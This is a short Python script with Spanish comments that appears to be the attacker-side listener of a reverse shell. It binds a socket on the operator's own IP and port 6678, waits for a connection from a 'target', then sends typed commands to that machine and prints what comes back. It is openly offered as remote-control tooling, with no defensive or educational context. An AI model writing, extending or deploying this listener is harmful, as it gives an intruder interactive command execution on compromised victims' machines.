#libreria para el server
import socket

def shell():
    current_dir = target.recv(3000)
    
    while True:  
        command = input(f"{current_dir.decode('utf-8')}> ").encode('utf-8')  
        if command.decode('utf-8') == "exit":
            break
        
        elif command.decode('utf-8').find("cd") == 0:
            target.send(command)
            res = target.recv(3000)
            current_dir = res
            
            
        else:
            try:
                target.send(command)
                res = target.recv(3000)
                if res == "1":
                    continue
                elif command.decode('utf-8')=="":
                    pass
                
                else:
                    print(res.decode('utf-8'))
            except:
                print("ocurrio un error")
                pass

def start_server():
    
    #en este apartado colocamos la ip nuestra
    ip = "#"
    #puerto de preferencia
    port = 6678
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    
    server.listen(5)
    print("Servidor funcionando, esperando una conexión...")
    
    global target  
    target, addr = server.accept()
    print("Conexión establecida desde:", addr)
    
    shell()  
    
    target.close()
    server.close()

start_server()

#esto lo hizo juliantilin 